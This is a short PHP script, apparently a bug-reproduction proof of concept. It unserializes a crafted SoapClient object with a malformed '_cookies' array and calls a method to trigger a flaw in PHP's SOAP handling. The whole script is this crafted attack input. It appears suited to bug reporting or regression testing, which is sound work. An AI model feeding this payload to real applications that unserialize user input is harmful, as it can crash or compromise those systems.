<?php
$exploit = unserialize('O:10:"SoapClient":3:{s:3:"uri";s:1:"a";s:8:"location";s:19:"http://example.org/";s:8:"_cookies";a:1:{s:8:"manhluat";a:3:{i:0;s:0:"";i:1;N;i:2;N;}}}}');
try {
$exploit->blahblah();
} catch(SoapFault $e) {
	echo $e->getMessage()."\n";
}
?>
